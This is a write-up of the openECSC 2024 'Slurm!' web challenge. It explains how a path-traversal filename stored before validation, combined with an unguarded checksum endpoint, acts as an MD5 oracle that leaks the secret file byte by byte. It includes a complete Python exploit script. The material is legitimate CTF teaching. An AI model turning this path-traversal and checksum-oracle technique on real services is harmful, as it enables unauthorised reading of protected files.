# openECSC 2024 - Final Round

## [web] Slurm! (41 solves)

Welcome to slurm's official website, here you're going to learn a lot of new reasons to drink slurm. And please don't ask about our secret recipe... some secrets must remain secrets.

Site: [http://slurm.challs.open.ecsc2024.it](http://slurm.challs.open.ecsc2024.it)

Author: Vittorio Mignini <@M1gnus>

## Overview

The challenge allow a user to download a set of predetermined files and to upload a txt file with suggestion about slurm marketing plan:

![marketing-download](./writeup/marketing-download.png)

![marketing-upload](./writeup/marketing-upload.png)

Let's look closer to api implementation, the backend server offers the following endpoints:
* `GET /files` -> Download a list of files metadata which represents the files offered in website's homepage
* `GET /files/<id>` -> Download the file with specified `id`
* `POST /files` -> Create a file
* `PUT /files/<id>` -> Create a file with the specified `id`
* `GET /files/<id>/checksum` -> Get the checksum for the file specified by `id`

There's a lot of constraints which disallow a user to break files integrity or to obtain secrets, like:
* It is not possible to overwrite a marketing file
* It is not possible to download the secret recipe
* It is not possible to perform path traversal, `./` in filename are filtered

The target is to obtain the secret recipe, which obviously is the flag.

## Solution

By looking closer to `FileMetadata.write`:

```py
def write(self, collection, content):
    if self.id in forbidden_ids and not self.init:
        raise ValueError("Use of forbidden id")

    print(collection.insert_one(vars(self)))

    if "./" in self.path:
        raise PathTraversalAttemptDetectedException()
    if len(content) > 200:
        raise FileTooBigException()
    with open(self.path, "w") as f:
        f.write(content)
```

metadatas are inserted in database even if a path traversal attempt is detected,
and even if the endpoint `/files/<id>` checks that the path doesn't contains
the secret recipe filename:

```py
if files[-1]["metadata"]["filename"] in res["filename"]:
    return "", 403
```

this check isn't performed by the endpoint `/files/<id>/checksum`. This
with the query parameter `offset` can be used to perform a oracle. More
specifically, a binary search algorithm can be used to find the exact length
of the secret recipe file, and then to guess all the characters from the
last one.

## Exploit

```py
import os
import time
import string
import hashlib
import requests
from uuid import uuid4

BASE_URL = os.getenv("BASE_URL", "http://slurm.challs.open.ecsc2024.it/api/v1")

# Exploit path traversal
file_id = str(uuid4())
requests.put(
    f"{BASE_URL}/files/{file_id}",
    json = {
        "author": "challenger",
        "filename": "../company/secretrecipe.txt",
        "description": "exploit",
        "content": "exploit"
    }
)

# Find flag length
desired_result = hashlib.md5(b'}').hexdigest()
empty = hashlib.md5(b'').hexdigest()
result = b''
i = 0
f = 200
offset = (i + f) // 2
while True:
    result = requests.get(f"{BASE_URL}/files/{file_id}/checksum?offset={offset}").json()["checksum"]
    if result == desired_result:
        break
    if result == empty:
        f = offset
        offset = (i + f)//2
    else:
        i = offset
        offset = (i + f)//2

print(f"FLAG HAS {offset} characters")

#recover flag
flag = "}"
while offset > 0:
    offset -= 1
    desired_result = requests.get(f"{BASE_URL}/files/{file_id}/checksum?offset={offset}").json()["checksum"]
    for c in string.printable:
        tmp_flag = f"{c}{flag}"
        print(tmp_flag, end="\r")
        if hashlib.md5(tmp_flag.encode()).hexdigest() == desired_result:
            flag = tmp_flag
            break
    time.sleep(.1)
print()
```